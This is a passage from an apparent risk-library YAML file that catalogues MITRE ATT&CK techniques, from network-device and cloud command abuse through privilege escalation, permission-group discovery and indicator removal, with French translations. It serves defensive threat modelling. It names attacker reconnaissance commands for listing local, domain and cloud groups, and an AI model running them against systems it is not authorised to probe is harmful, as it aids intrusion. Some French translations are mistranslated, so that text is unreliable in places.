          ches et \xE9tendent les fonctionnalit\xE9s au-del\xE0 du jeu de commandes\
          \ inclus dans le syst\xE8me d\u2019exploitation r\xE9seau. La CLI et l\u2019\
          interpr\xE9teur de script sont accessibles via une connexion directe \xE0\
          \ la console, ou par des moyens distants, tels que telnet ou [SSH](https://attack.mitre.org/techniques/T1021/004).\n\
          \nLes adversaires peuvent utiliser la ligne de commande r\xE9seau pour modifier\
          \ le comportement et le fonctionnement des appareils r\xE9seau. La CLI peut\
          \ \xEAtre utilis\xE9e pour manipuler les flux de trafic afin d\u2019intercepter\
          \ ou manipuler des donn\xE9es, modifier les param\xE8tres de configuration\
          \ de d\xE9marrage pour charger un logiciel syst\xE8me malveillant, ou d\xE9\
          sactiver des fonctions de s\xE9curit\xE9 ou des journaux afin d\u2019\xE9\
          viter la d\xE9tection. (Citation : Cisco Synful Knock Evolution)\nhttps://attack.mitre.org/techniques/T1059/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.009
    ref_id: T1059.009
    name: Cloud API
    description: "Adversaries may abuse cloud APIs to execute malicious commands.\
      \ APIs available in cloud environments provide various functionalities and are\
      \ a feature-rich method for programmatic access to nearly all aspects of a tenant.\
      \ These APIs may be utilized through various methods such as command line interpreters\
      \ (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell),\
      \ or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).\
      \  \n\nCloud API functionality may allow for administrative access across all\
      \ major services in a tenant such as compute, storage, identity and access management\
      \ (IAM), networking, and security policies.\n\nWith proper permissions (often\
      \ via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001)\
      \ and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)),\
      \ adversaries may abuse cloud APIs to invoke various functions that execute\
      \ malicious actions. For example, CLI and PowerShell functionality may be accessed\
      \ through binaries installed on cloud-hosted or on-premises hosts or accessed\
      \ through a browser-based cloud shell offered by many cloud platforms (such\
      \ as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment\
      \ to use CLI and/or scripting modules hosted as a container in the cloud environment.\n\
      https://attack.mitre.org/techniques/T1059/009"
    translations:
      fr:
        name: Cloud API
        description: "Les adversaires peuvent abuser des API cloud pour ex\xE9cuter\
          \ des commandes malveillantes. Les API disponibles dans les environnements\
          \ cloud offrent diverses fonctionnalit\xE9s et constituent une m\xE9thode\
          \ riche en fonctionnalit\xE9s pour acc\xE9der de mani\xE8re programmatique\
          \ \xE0 presque tous les aspects d\u2019un locataire. Ces API peuvent \xEA\
          tre utilis\xE9es par diverses m\xE9thodes telles que les interpr\xE9teurs\
          \ en ligne de commande (CLI), les Cloud Shell int\xE9gr\xE9s au navigateur,\
          \ les modules [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ comme Azure for PowerShell (citation : Microsoft - Azure PowerShell),\
          \ ou les kits de d\xE9veloppement logiciel (SDK) disponibles pour des langages\
          \ tels que [Python](https://attack.mitre.org/techniques/T1059/006).  \n\n\
          La fonctionnalit\xE9 de l\u2019API cloud peut permettre un acc\xE8s administratif\
          \ \xE0 tous les services majeurs d\u2019un locataire tels que le calcul,\
          \ le stockage, la gestion des identit\xE9s et des acc\xE8s (IAM), le r\xE9\
          seau et les politiques de s\xE9curit\xE9.\n\nAvec des permissions appropri\xE9\
          es (souvent via l\u2019utilisation de cr\xE9dents telles que [Application\
          \ Access Token](https://attack.mitre.org/techniques/T1550/001) et [Web Session\
          \ Cookie](https://attack.mitre.org/techniques/T1550/004)), les adversaires\
          \ peuvent abuser des API cloud pour invoquer diverses fonctions ex\xE9cutant\
          \ des actions malveillantes. Par exemple, les fonctionnalit\xE9s CLI et\
          \ PowerShell peuvent \xEAtre accessibles via des binaires install\xE9s sur\
          \ des h\xF4tes h\xE9berg\xE9s dans le cloud ou sur site, ou via un cloud\
          \ shell bas\xE9 sur navigateur propos\xE9 par de nombreuses plateformes\
          \ cloud (telles qu\u2019AWS, Azure et GCP). Ces cloud shells sont souvent\
          \ un environnement unifi\xE9 empaquet\xE9 pour utiliser des modules CLI\
          \ et/ou scripting h\xE9berg\xE9s comme conteneurs dans l\u2019environnement\
          \ cloud.\nhttps://attack.mitre.org/techniques/T1059/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.010
    ref_id: T1059.010
    name: AutoHotKey & AutoIT
    description: 'Adversaries may execute commands and perform malicious tasks using
      AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting
      languages that enable users to automate Windows tasks. These automation scripts
      can be used to perform a wide variety of actions, such as clicking on buttons,
      entering text, and opening and closing programs.(Citation: AutoIT)(Citation:
      AutoHotKey)


      Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious
      code on a victim''s system. For example, adversaries have used for AHK to execute
      payloads and other modular malware such as keyloggers. Adversaries have also
      used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566)
      payloads.(Citation: Splunk DarkGate)


      These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation:
      AutoIT)(Citation: AutoHotKey)

      https://attack.mitre.org/techniques/T1059/010'
    translations:
      fr:
        name: AutoHotKey & AutoIT
        description: "Les adversaires peuvent ex\xE9cuter des commandes et effectuer\
          \ des t\xE2ches malveillantes en utilisant des scripts d\u2019automatisation\
          \ AutoIT et AutoHotKey. AutoIT et AutoHotkey (AHK) sont des langages de\
          \ script qui permettent aux utilisateurs d\u2019automatiser les t\xE2ches\
          \ Windows. Ces scripts d\u2019automatisation peuvent \xEAtre utilis\xE9\
          s pour effectuer une grande vari\xE9t\xE9 d\u2019actions, telles que cliquer\
          \ sur des boutons, saisir du texte, et ouvrir et fermer des programmes.\
          \ (Citation : AutoIT)(Citation : AutoHotKey)\n\nLes adversaires peuvent\
          \ utiliser des scripts AHK ('.ahk') et AutoIT ('.au3') pour ex\xE9cuter\
          \ du code malveillant sur le syst\xE8me d\u2019une victime. Par exemple,\
          \ des adversaires ont utilis\xE9 AHK pour ex\xE9cuter des charges utiles\
          \ et d\u2019autres logiciels malveillants modulaires tels que des keyloggers.\
          \ Les adversaires ont \xE9galement utilis\xE9 des fichiers AHK personnalis\xE9\
          s contenant des logiciels malveillants int\xE9gr\xE9s comme charges utiles\
          \ [Phishing](https://attack.mitre.org/techniques/T1566). (Citation : Splunk\
          \ DarkGate)\n\nCes scripts peuvent \xE9galement \xEAtre compil\xE9s en charges\
          \ utiles ex\xE9cutables autonomes (\xAB .exe \xBB). (Citation : AutoIT)(Citation\
          \ : AutoHotKey)\nhttps://attack.mitre.org/techniques/T1059/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.011
    ref_id: T1059.011
    name: Lua
    description: 'Adversaries may abuse Lua commands and scripts for execution. Lua
      is a cross-platform scripting and programming language primarily designed for
      embedded use in applications. Lua can be executed on the command-line (through
      the stand-alone lua interpreter), via scripts (<code>.lua</code>), or from Lua-embedded
      programs (through the <code>struct lua_State</code>).(Citation: Lua main page)(Citation:
      Lua state)


      Lua scripts may be executed by adversaries for malicious purposes. Adversaries
      may incorporate, abuse, or replace existing Lua interpreters to allow for malicious
      Lua command execution at runtime.(Citation: PoetRat Lua)(Citation: Lua Proofpoint
      Sunseed)(Citation: Cyphort EvilBunny)(Citation: Kaspersky Lua)

      https://attack.mitre.org/techniques/T1059/011'
    translations:
      fr:
        name: Lua
        description: "Les adversaires peuvent abuser des commandes et scripts Lua\
          \ pour les ex\xE9cuter. Lua est un langage de script et de programmation\
          \ multiplateforme principalement con\xE7u pour une utilisation embarqu\xE9\
          e dans les applications. Lua peut \xEAtre ex\xE9cut\xE9 en ligne de commande\
          \ (via l\u2019interpr\xE9teur lua autonome), via des scripts (<code>.lua</code>),\
          \ ou depuis des programmes embarqu\xE9s en Lua (via le <code>lua_State struct</code>).\
          \ (Citation : page principale de Lua)(Citation : \xC9tat Lua)\n\nLes scripts\
          \ Lua peuvent \xEAtre ex\xE9cut\xE9s par des adversaires \xE0 des fins malveillantes.\
          \ Les adversaires peuvent incorporer, abuser ou remplacer des interpr\xE9\
          teurs Lua existants pour permettre l\u2019ex\xE9cution de commandes Lua\
          \ malveillantes \xE0 l\u2019ex\xE9cution. (Citation : PoetRat Lua)(Citation\
          \ : Lua Proofpoint Sunseed)(Citation : Cyphort EvilBunny)(Citation : Kaspersky\
          \ Lua)\nhttps://attack.mitre.org/techniques/T1059/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.012
    ref_id: T1059.012
    name: Hypervisor CLI
    description: "Adversaries may abuse hypervisor command line interpreters (CLIs)\
      \ to execute malicious commands. Hypervisor CLIs typically enable a wide variety\
      \ of functionality for managing both the hypervisor itself and the guest virtual\
      \ machines it hosts. \n\nFor example, on ESXi systems, tools such as `esxcli`\
      \ and `vim-cmd` allow administrators to configure firewall rules and log forwarding\
      \ on the hypervisor, list virtual machines, start and stop virtual machines,\
      \ and more.(Citation: Broadcom ESXCLI Reference)(Citation: Crowdstrike Hypervisor\
      \ Jackpotting Pt 2 2021)(Citation: LOLESXi) Adversaries may be able to leverage\
      \ these tools in order to support further actions, such as [File and Directory\
      \ Discovery](https://attack.mitre.org/techniques/T1083) or [Data Encrypted for\
      \ Impact](https://attack.mitre.org/techniques/T1486).\nhttps://attack.mitre.org/techniques/T1059/012"
    translations:
      fr:
        name: "CLI de l\u2019hyperviseur"
        description: "Les adversaires peuvent abuser des interpr\xE9teurs en ligne\
          \ de commande hyperviseur (CLI) pour ex\xE9cuter des commandes malveillantes.\
          \ Les interfaces de commande d\u2019hyperviseur permettent g\xE9n\xE9ralement\
          \ une grande vari\xE9t\xE9 de fonctionnalit\xE9s pour g\xE9rer \xE0 la fois\
          \ l\u2019hyperviseur lui-m\xEAme et les machines virtuelles invit\xE9es\
          \ qu\u2019il h\xE9berge. \n\nPar exemple, sur les syst\xE8mes ESXi, des\
          \ outils comme \xAB esxcli \xBB et \xAB vim-cmd \xBB permettent aux administrateurs\
          \ de configurer les r\xE8gles de pare-feu et de loger le transfert sur l\u2019\
          hyperviseur, de lister les machines virtuelles, de d\xE9marrer et d\u2019\
          arr\xEAter des machines virtuelles, et plus encore. (Citation : R\xE9f\xE9\
          rence Broadcom ESXCLI)(Citation : Crowdstrike Hyperviseur Jackpotting Partie\
          \ 2 2021)(Citation : LOLESXi) Les adversaires peuvent utiliser ces outils\
          \ pour soutenir d\u2019autres actions, telles que [D\xE9couverte de fichiers\
          \ et annuaires](https://attack.mitre.org/techniques/T1083) ou [Donn\xE9\
          es chiffr\xE9es pour impact](https://attack.mitre.org/techniques/T1486).\n\
          https://attack.mitre.org/techniques/T1059/012"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.013
    ref_id: T1059.013
    name: Container CLI/API
    description: 'Adversaries may abuse built-in CLI tools or API calls to execute
      malicious commands in containerized environments.


      The Docker CLI is used for managing containers via an exposed API point from
      the `dockerd` daemon. Some common examples of Docker CLI include Docker Desktop
      CLI and Docker Compose, but users are also able to use SDKs to interact with
      the API. For example, Docker SDK for Python can be used to run commands within
      a Python application.(Citation: Docker Desktop CLI)


      Adversaries may leverage the Docker CLI, API, or SDK to pull or build Docker
      images (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105),
      [Build Image on Host](https://attack.mitre.org/techniques/T1612)), run containers
      (i.e., [Deploy Container](https://attack.mitre.org/techniques/T1610)), or execute
      commands inside running containers (i.e., [Container Administration Command](https://attack.mitre.org/techniques/T1609)).
      In some cases, threat actors may pull legitimate images that include scripts
      or tools that they can leverage - for example, using an image that includes
      the `curl` command to download payloads.(Citation: Intezer) Adversaries may
      also utilize `docker inspect` and `docker ps` to scan for cloud environment
      variables and other running containers (i.e., [Container and Resource Discovery](https://attack.mitre.org/techniques/T1613)).(Citation:
      Cisco Talos Blog)(Citation: aquasec)


      Kubernetes is responsible for the management and orchestration of containers
      across clusters. The Kubernetes control plane, which manages the state of the
      cluster and is responsible for scheduling, communication, and resource monitoring,
      can be invoked directly via the API or indirectly via CLI tools such as `kubectl`.
      It may also be accessed within client libraries such as Go or Python. By utilizing
      the API, administrators can interact with resources within the cluster such
      as listing or creating pods, which is a group of one or more containers. Adversaries
      call the API server via `curl` or other tools, allowing them to obtain further
      information about the environment such as pods, deployments, daemonsets, namespaces,
      or sysvars.(Citation: aquasec) They may also run various commands regarding
      resource management.

      https://attack.mitre.org/techniques/T1059/013'
    translations:
      fr:
        name: Conteneur CLI/API
        description: "Les adversaires peuvent abuser des outils CLI int\xE9gr\xE9\
          s ou des appels API pour ex\xE9cuter des commandes malveillantes dans des\
          \ environnements conteneuris\xE9s.\n\nLa CLI Docker est utilis\xE9e pour\
          \ g\xE9rer les conteneurs via un point API expos\xE9 depuis le d\xE9mon\
          \ \xAB dockerd \xBB. Quelques exemples courants de CLI Docker incluent Docker\
          \ Desktop CLI et Docker Compose, mais les utilisateurs peuvent aussi utiliser\
          \ des SDK pour interagir avec l\u2019API. Par exemple, le SDK Docker pour\
          \ Python peut \xEAtre utilis\xE9 pour ex\xE9cuter des commandes au sein\
          \ d\u2019une application Python. (Citation : CLI de bureau Docker)\n\nLes\
          \ adversaires peuvent utiliser la ligne de cli, l\u2019API ou le SDK Docker\
          \ pour extraire ou construire des images Docker (c\u2019est-\xE0-dire [Ingress\
          \ Tool Transfer](https://attack.mitre.org/techniques/T1105), [Build Image\
          \ on Host](https://attack.mitre.org/techniques/T1612)), ex\xE9cuter des\
          \ conteneurs (c\u2019est-\xE0-dire [Deploy Container](https://attack.mitre.org/techniques/T1610))\
          \ ou ex\xE9cuter des commandes \xE0 l\u2019int\xE9rieur de conteneurs en\
          \ cours de marche (c\u2019est-\xE0-dire [Conteneur Administration Command](https://attack.mitre.org/techniques/T1609)).\
          \ Dans certains cas, les acteurs malveillants peuvent extraire des images\
          \ l\xE9gitimes incluant des scripts ou des outils qu\u2019ils peuvent exploiter\
          \ \u2013 par exemple, en utilisant une image contenant la commande \xAB\
          \ curl \xBB pour t\xE9l\xE9charger des charges utiles. (Citation : Intezer)\
          \ Les adversaires peuvent \xE9galement utiliser \xAB docker inspect \xBB\
          \ et \xAB docker ps \xBB pour analyser les variables d\u2019environnement\
          \ cloud et d\u2019autres conteneurs en cours (c\u2019est-\xE0-dire [D\xE9\
          couverte de conteneurs et de ressources](https://attack.mitre.org/techniques/T1613)).\
          \ (Citation : Blog Cisco Talos)(Citation : aquasec)\n\nKubernetes est responsable\
          \ de la gestion et de l\u2019orchestration des conteneurs \xE0 travers les\
          \ clusters. Le plan de contr\xF4le Kubernetes, qui g\xE8re l\u2019\xE9tat\
          \ du cluster et est responsable de la planification, de la communication\
          \ et de la surveillance des ressources, peut \xEAtre invoqu\xE9 directement\
          \ via l\u2019API ou indirectement via des outils CLI tels que \xAB kubectl\
          \ \xBB. Il peut \xE9galement \xEAtre consult\xE9 dans des biblioth\xE8ques\
          \ clients telles que Go ou Python. En utilisant l\u2019API, les administrateurs\
          \ peuvent interagir avec les ressources du cluster, comme la liste ou la\
          \ cr\xE9ation de pods, qui est un groupe d\u2019un ou plusieurs conteneurs.\
          \ Les adversaires appellent le serveur API via un \xAB curl \xBB ou d\u2019\
          autres outils, leur permettant d\u2019obtenir plus d\u2019informations sur\
          \ l\u2019environnement telles que des pods, des d\xE9ploiements, des ensembles\
          \ de daemons, des espaces de noms ou des sysvars. (Citation : aquasec) Ils\
          \ peuvent \xE9galement ex\xE9cuter diverses commandes concernant la gestion\
          \ des ressources.\nhttps://attack.mitre.org/techniques/T1059/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1068
    ref_id: T1068
    name: Exploitation for Privilege Escalation
    description: 'Adversaries may exploit software vulnerabilities in an attempt to
      elevate privileges. Exploitation of a software vulnerability occurs when an
      adversary takes advantage of a programming error in a program, service, or within
      the operating system software or kernel itself to execute adversary-controlled
      code. Security constructs such as permission levels will often hinder access
      to information and use of certain techniques, so adversaries will likely need
      to perform privilege escalation to include use of software exploitation to circumvent
      those restrictions.


      When initially gaining access to a system, an adversary may be operating within
      a lower privileged process which will prevent them from accessing certain resources
      on the system. Vulnerabilities may exist, usually in operating system components
      and software commonly running at higher permissions, that can be exploited to
      gain higher levels of access on the system. This could enable someone to move
      from unprivileged or user level permissions to SYSTEM or root permissions depending
      on the component that is vulnerable. This could also enable an adversary to
      move from a virtualized environment, such as within a virtual machine or container,
      onto the underlying host. This may be a necessary step for an adversary compromising
      an endpoint system that has been properly configured and limits other privilege
      escalation methods.


      Adversaries may bring a signed vulnerable driver onto a compromised machine
      so that they can exploit the vulnerability to execute code in kernel mode. This
      process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation:
      ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may
      include the vulnerable driver with files delivered during Initial Access or
      download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)
      or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).

      https://attack.mitre.org/techniques/T1068'
    translations:
      fr:
        name: "Exploitation pour l\u2019escalade des privil\xE8ges"
        description: "Les adversaires peuvent exploiter des vuln\xE9rabilit\xE9s logicielles\
          \ dans le but d\u2019augmenter leurs privil\xE8ges. L\u2019exploitation\
          \ d\u2019une vuln\xE9rabilit\xE9 logicielle survient lorsqu\u2019un adversaire\
          \ profite d\u2019une erreur de programmation dans un programme, un service,\
          \ ou dans le logiciel ou le noyau du syst\xE8me d\u2019exploitation lui-m\xEA\
          me pour ex\xE9cuter du code contr\xF4l\xE9 par l\u2019adversaire. Des constructions\
          \ de s\xE9curit\xE9 telles que les niveaux d\u2019autorisation entravent\
          \ souvent l\u2019acc\xE8s \xE0 l\u2019information et l\u2019utilisation\
          \ de certaines techniques, si bien que les adversaires devront probablement\
          \ proc\xE9der \xE0 une escalade de privil\xE8ges pour inclure l\u2019exploitation\
          \ logicielle afin de contourner ces restrictions.\n\nLors de l\u2019acc\xE8\
          s initial \xE0 un syst\xE8me, un adversaire peut op\xE9rer dans un processus\
          \ \xE0 faible privil\xE8ge qui l\u2019emp\xEAchera d\u2019acc\xE9der \xE0\
          \ certaines ressources du syst\xE8me. Des vuln\xE9rabilit\xE9s peuvent exister,\
          \ g\xE9n\xE9ralement dans des composants du syst\xE8me d\u2019exploitation\
          \ et des logiciels courant avec des permissions plus \xE9lev\xE9es, qui\
          \ peuvent \xEAtre exploit\xE9es pour obtenir des niveaux d\u2019acc\xE8\
          s plus \xE9lev\xE9s au syst\xE8me. Cela pourrait permettre \xE0 quelqu\u2019\
          un de passer des permissions non privil\xE9gi\xE9es ou au niveau utilisateur\
          \ vers des permissions SYST\xC8ME ou root selon le composant vuln\xE9rable.\
          \ Cela pourrait \xE9galement permettre \xE0 un adversaire de passer d\u2019\
          un environnement virtualis\xE9, tel que dans une machine virtuelle ou un\
          \ conteneur, vers l\u2019h\xF4te sous-jacent. Cela peut \xEAtre une \xE9\
          tape n\xE9cessaire pour un adversaire compromettant un syst\xE8me endpoint\
          \ correctement configur\xE9 et limitant d\u2019autres m\xE9thodes d\u2019\
          escalade de privil\xE8ges.\n\nLes adversaires peuvent amener un pilote vuln\xE9\
          rable sign\xE9 sur une machine compromise afin d\u2019exploiter cette vuln\xE9\
          rabilit\xE9 pour ex\xE9cuter du code en mode noyau. Ce processus est parfois\
          \ appel\xE9 \xAB Am\xE8ne ton propre conducteur vuln\xE9rable \xBB (BYOVD).\
          \ (Citation : ESET InvisiMole juin 2020)(Citation : Unit42 AcidBox juin\
          \ 2020) Les adversaires peuvent inclure le pilote vuln\xE9rable dont les\
          \ fichiers sont livr\xE9s lors de l\u2019acc\xE8s initial ou le t\xE9l\xE9\
          charger vers un syst\xE8me compromis via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)\
          \ ou [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).\n\
          https://attack.mitre.org/techniques/T1068"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069
    ref_id: T1069
    name: Permission Groups Discovery
    description: 'Adversaries may attempt to discover group and permission settings.
      This information can help adversaries determine which user accounts and groups
      are available, the membership of users in particular groups, and which users
      and groups have elevated permissions.


      Adversaries may attempt to discover group permission settings in many different
      ways. This data may provide the adversary with information about the compromised
      environment that can be used in follow-on activity and targeting.(Citation:
      CrowdStrike BloodHound April 2018)

      https://attack.mitre.org/techniques/T1069'
    translations:
      fr:
        name: "D\xE9couverte des groupes de permission"
        description: "Les adversaires peuvent tenter de d\xE9couvrir les param\xE8\
          tres de groupe et d\u2019autorisation. Ces informations peuvent aider les\
          \ adversaires \xE0 d\xE9terminer quels comptes et groupes d\u2019utilisateurs\
          \ sont disponibles, l\u2019appartenance des utilisateurs \xE0 certains groupes,\
          \ et quels utilisateurs et groupes ont des permissions accrues.\n\nLes adversaires\
          \ peuvent tenter de d\xE9couvrir les param\xE8tres d\u2019autorisation des\
          \ groupes de multiples mani\xE8res. Ces donn\xE9es peuvent fournir \xE0\
          \ l\u2019adversaire des informations sur l\u2019environnement compromis\
          \ qui peuvent \xEAtre utilis\xE9es dans des activit\xE9s et des ciblages\
          \ ult\xE9rieurs. (Citation : CrowdStrike Bloodhound avril 2018)\nhttps://attack.mitre.org/techniques/T1069"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069.001
    ref_id: T1069.001
    name: Local Groups
    description: 'Adversaries may attempt to find local system groups and permission
      settings. The knowledge of local system permission groups can help adversaries
      determine which groups exist and which users belong to a particular group. Adversaries
      may use this information to determine which users have elevated permissions,
      such as the users found within the local administrators group.


      Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039)
      utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code>
      on Linux can list local groups.

      https://attack.mitre.org/techniques/T1069/001'
    translations:
      fr:
        name: Groupes locaux
        description: "Les adversaires peuvent tenter de trouver des groupes de syst\xE8\
          mes locaux et des param\xE8tres d\u2019autorisation. La connaissance des\
          \ groupes de permissions syst\xE8me locaux peut aider les adversaires \xE0\
          \ d\xE9terminer quels groupes existent et quels utilisateurs appartiennent\
          \ \xE0 un groupe particulier. Les adversaires peuvent utiliser ces informations\
          \ pour d\xE9terminer quels utilisateurs ont des permissions \xE9lev\xE9\
          es, comme les utilisateurs situ\xE9s dans le groupe d\u2019administrateurs\
          \ locaux.\n\nDes commandes telles que <code>net-localgroup</code> de l\u2019\
          utilitaire [Net](https://attack.mitre.org/software/S0039), <code>dscl .\
          \ -list /Groups</code> sur macOS, et <code>groupes</code> sous Linux peuvent\
          \ lister les groupes locaux.\nhttps://attack.mitre.org/techniques/T1069/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069.002
    ref_id: T1069.002
    name: Domain Groups
    description: 'Adversaries may attempt to find domain-level groups and permission
      settings. The knowledge of domain-level permission groups can help adversaries
      determine which groups exist and which users belong to a particular group. Adversaries
      may use this information to determine which users have elevated permissions,
      such as domain administrators.


      Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039)
      utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code>
      on Linux can list domain-level groups.

      https://attack.mitre.org/techniques/T1069/002'
    translations:
      fr:
        name: Groupes de domaines
        description: "Les adversaires peuvent tenter de trouver des groupes au niveau\
          \ du domaine et des param\xE8tres de permission. La connaissance des groupes\
          \ de permissions au niveau du domaine peut aider les adversaires \xE0 d\xE9\
          terminer quels groupes existent et quels utilisateurs appartiennent \xE0\
          \ un groupe particulier. Les adversaires peuvent utiliser ces informations\
          \ pour d\xE9terminer quels utilisateurs ont des permissions \xE9lev\xE9\
          es, comme les administrateurs de domaine.\n\nDes commandes telles que <code>net\
          \ group /domain</code> de l\u2019utilitaire [Net](https://attack.mitre.org/software/S0039),\
          \ <code>dscacheutil -q</code> group sur macOS, et <code>ldapsearch</code>\
          \ sur Linux peuvent lister des groupes au niveau du domaine.\nhttps://attack.mitre.org/techniques/T1069/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069.003
    ref_id: T1069.003
    name: Cloud Groups
    description: 'Adversaries may attempt to find cloud groups and permission settings.
      The knowledge of cloud permission groups can help adversaries determine the
      particular roles of users and groups within an environment, as well as which
      users are associated with a particular group.


      With authenticated access there are several tools that can be used to find permissions
      groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain
      roles and permissions groups for Exchange and Office 365 accounts (Citation:
      Microsoft Msolrole)(Citation: GitHub Raindance).


      Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces
      to obtain permissions groups. The command <code>az ad user get-member-groups</code>
      will list groups associated to a user account for Azure while the API endpoint
      <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group
      resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation:
      Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API
      Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies`
      allow users to enumerate the policies attached to a role.(Citation: Palo Alto
      Unit 42 Compromised Cloud Compute Credentials 2022)


      Adversaries may attempt to list ACLs for objects to determine the owner and
      other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code>
      API (Citation: AWS Get Bucket ACL). Using this information an adversary can
      target accounts with permissions to a given object or leverage accounts they
      have already compromised to access the object.

      https://attack.mitre.org/techniques/T1069/003'
    translations:
      fr:
        name: Groupes Cloud
        description: "Les adversaires peuvent tenter de trouver des groupes cloud\
          \ et des param\xE8tres d\u2019autorisation. La connaissance des groupes\
          \ de permissions cloud peut aider les adversaires \xE0 d\xE9terminer les\
          \ r\xF4les particuliers des utilisateurs et des groupes au sein d\u2019\
          un environnement, ainsi que les utilisateurs associ\xE9s \xE0 un groupe\
          \ particulier.\n\nAvec l\u2019acc\xE8s authentifi\xE9, plusieurs outils\
          \ peuvent \xEAtre utilis\xE9s pour trouver des groupes de permissions. Le\
          \ cmdlet <code>PowerShell Get-MsolRole</code> peut \xEAtre utilis\xE9 pour\
          \ obtenir des r\xF4les et des groupes d\u2019autorisations pour les comptes\
          \ Exchange et Office 365 (Citation : Microsoft Msolrole)(Citation : GitHub\
          \ Raindance).\n\nAzure CLI (AZ CLI) et l\u2019API Google Cloud Identity\
          \ Provider fournissent \xE9galement des interfaces pour obtenir des groupes\
          \ d\u2019autorisations. La commande <code>az ad user get-member-groups</code>\
          \ listera les groupes associ\xE9s \xE0 un compte utilisateur pour Azure\
          \ tandis que le point de terminaison <code>API GET https://cloudidentity.googleapis.com/v1/groups</code>\
          \ liste les ressources de groupe disponibles pour un utilisateur pour Google.\
          \ (Citation : Microsoft AZ CLI)(Citation : Black Hills Red Teaming MS AD\
          \ Azure, 2018)(Citation : Documentation de l\u2019API Google Cloud Identity)\
          \ Dans AWS, les commandes \xAB ListRolePolicies \xBB et \xAB ListAttachedRolePolicies\
          \ \xBB permettent aux utilisateurs d\u2019\xE9num\xE9rer les politiques\
          \ attach\xE9es \xE0 un r\xF4le. (Citation : Identifiants Cloud Compute compromis\
          \ de Palo Alto Unit 42 2022)\n\nLes adversaires peuvent tenter de lister\
          \ les ACL pour les objets afin de d\xE9terminer le propri\xE9taire et d\u2019\
          autres comptes ayant acc\xE8s \xE0 l\u2019objet, par exemple via l\u2019\
          API <code>AWS GetBucketAcl</code> (Citation : AWS Get Bucket ACL). Gr\xE2\
          ce \xE0 ces informations, un adversaire peut cibler des comptes ayant des\
          \ autorisations sur un objet donn\xE9 ou exploiter des comptes qu\u2019\
          il a d\xE9j\xE0 compromis pour acc\xE9der \xE0 l\u2019objet.\nhttps://attack.mitre.org/techniques/T1069/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070
    ref_id: T1070
    name: Indicator Removal
    description: 'Adversaries may selectively delete or modify artifacts generated
      to reduce indications of their presence and blend in with legitimate activity.
      Rather than broadly removing evidence, adversaries may target specific artifacts
      that appear anomalous or are likely to draw scrutiny, while leaving sufficient
      data intact to maintain the appearance of normal system behavior.


      Artifacts such as command histories, log entries, or file metadata may be altered
      in ways that align with expected user or system activity. Location, format,
      and type of artifact (such as command or login history) are often platform-specific,
      allowing adversaries to tailor modifications that minimize suspicion.


      These actions may not prevent detection entirely but can delay recognition of
      malicious activity or reduce the fidelity of alerts by making events appear
      benign or consistent with routine operations. Additionally, selectively removed
      or modified artifacts may still be recoverable through deeper forensic analysis,
      though their absence or alteration can complicate timeline reconstruction and
      attribution.

      https://attack.mitre.org/techniques/T1070'
    translations:
      fr:
        name: Retrait des indicateurs
        description: "Les adversaires peuvent supprimer ou modifier s\xE9lectivement\
          \ les artefacts g\xE9n\xE9r\xE9s afin de r\xE9duire les signes de leur pr\xE9\
          sence et de se fondre dans une activit\xE9 l\xE9gitime. Plut\xF4t que de\
          \ supprimer largement les preuves, les adversaires peuvent cibler des artefacts\
          \ sp\xE9cifiques qui semblent anormaux ou susceptibles d\u2019attirer l\u2019\
          attention, tout en laissant suffisamment de donn\xE9es intactes pour maintenir\
          \ l\u2019apparence d\u2019un comportement normal du syst\xE8me.\n\nDes artefacts\
          \ tels que l\u2019historique des commandes, les entr\xE9es de journal ou\
          \ les m\xE9tadonn\xE9es de fichiers peuvent \xEAtre modifi\xE9s de mani\xE8\
          re \xE0 correspondre \xE0 l\u2019activit\xE9 attendue de l\u2019utilisateur\
          \ ou du syst\xE8me. L\u2019emplacement, le format et le type d\u2019artefact\
          \ (comme l\u2019historique des commandes ou des connexions) sont souvent\
          \ sp\xE9cifiques \xE0 chaque plateforme, permettant aux adversaires d\u2019\
          adapter des modifications pour minimiser les soup\xE7ons.\n\nCes actions\
          \ peuvent ne pas emp\xEAcher compl\xE8tement la d\xE9tection, mais peuvent\
